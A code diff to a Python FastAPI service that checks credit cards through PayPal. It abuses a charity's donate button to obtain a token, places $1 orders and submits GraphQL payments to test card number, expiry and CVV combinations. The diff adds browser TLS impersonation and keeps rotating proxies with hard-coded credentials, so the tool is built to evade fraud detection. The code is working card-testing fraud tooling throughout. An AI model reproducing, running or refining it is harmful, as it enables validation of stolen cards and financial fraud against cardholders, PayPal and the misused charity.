@@ -1,4 +1,3 @@
-import requests
 import asyncio
 import random
 import string
@@ -8,16 +7,14 @@ from fastapi import FastAPI
 from colorama import Fore, init
 from html import unescape
 from dotenv import load_dotenv
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
+from curl_cffi import requests
 
 load_dotenv()
 
 init(autoreset=True)
 app = FastAPI()
 
-# === CONFIGURACIÓN DESDE .env ===
-PAYPAL_PROXY_URL = os.getenv("PAYPAL_PROXY_URL", "http://qaxtdvtr-GT-rotate:cpyp473gyvje@p.webshare.io:80")
+PAYPAL_PROXY_URL = os.getenv("PAYPAL_PROXY_URL", "http://qaxtdvtr-US-rotate:cpyp473gyvje@p.webshare.io:80")
 PAYPAL_CLIENT_ID = os.getenv("PAYPAL_CLIENT_ID", "Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh")
 
 def get_session_id():
@@ -40,31 +37,17 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
     print(f"{Fore.CYAN}🔎 Probando con PayPal: {cc}|{mm}|{aa}|{cvv} (Session: {session_id})")
 
     head_base = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "application/json",
         "x-app-name": "hermione",
         "Origin": "https://www.paypal.com",
         "Referer": "https://onehealthworkforceacademies.org/"
     }
 
-    proxies = {"http": proxy_url, "https": proxy_url}
-    session = requests.Session()
-    session.proxies.update(proxies)
-    session.verify = False
-
-    retry = Retry(
-        total=3,
-        backoff_factor=0.5,
-        status_forcelist=(500, 502, 504)
-    )
-    adapter = HTTPAdapter(max_retries=retry)
-    session.mount('http://', adapter)
-    session.mount('https://', adapter)
-
     try:
         # PASO 1: Obtener Token Facilitador
         url_sdk = f"https://www.paypal.com/smart/buttons?style.label=donate&sdkVersion=5.0.390&clientID={PAYPAL_CLIENT_ID}&env=production&currency=USD&intent=capture"
-        r = session.get(url_sdk, headers=head_base, timeout=60)
+        r = requests.get(url_sdk, headers=head_base, proxy=proxy_url, timeout=30, impersonate="chrome120")
         token = capture(r.text, '"facilitatorAccessToken":"', '"')
 
         if not token:
@@ -76,7 +59,7 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
         # PASO 2: Crear Orden
         head2 = {**head_base, "Authorization": f"Bearer {token}", "Content-Type": "application/json"}
         post2 = {"purchase_units": [{"amount": {"currency_code": "USD", "value": "1"}}], "intent": "CAPTURE"}
-        r2 = session.post("https://www.paypal.com/v2/checkout/orders", headers=head2, json=post2, timeout=40)
+        r2 = requests.post("https://www.paypal.com/v2/checkout/orders", headers=head2, json=post2, proxy=proxy_url, timeout=30, impersonate="chrome120")
         order_id = capture(r2.text, '"id":"', '"')
 
         if not order_id:
@@ -87,7 +70,7 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
         print(f"{Fore.YELLOW}⏳ Esperando validación de PayPal...")
         await asyncio.sleep(random.uniform(5, 8))
 
-        # PASO 3: GraphQLa (Pago Final)
+        # PASO 3: GraphQL (Pago Final)
         head3 = {
             **head_base,
             "Content-Type": "application/json",
@@ -121,7 +104,7 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
             }
         }
 
-        r3 = session.post("https://www.paypal.com/graphql", headers=head3, json=graphql_payload, timeout=40)
+        r3 = requests.post("https://www.paypal.com/graphql", headers=head3, json=graphql_payload, proxy=proxy_url, timeout=30, impersonate="chrome120")
         res_text = r3.text
 
         err_code = capture(res_text, '"code":"', '"')
@@ -147,5 +130,4 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
 
 if __name__ == "__main__":
     port = int(os.getenv("PAYPAL_PORT", 8000))
-    # Escuchar en 0.0.0.0 para aceptar conexiones remotas en VPS
     uvicorn.run(app, host="0.0.0.0", port=port)
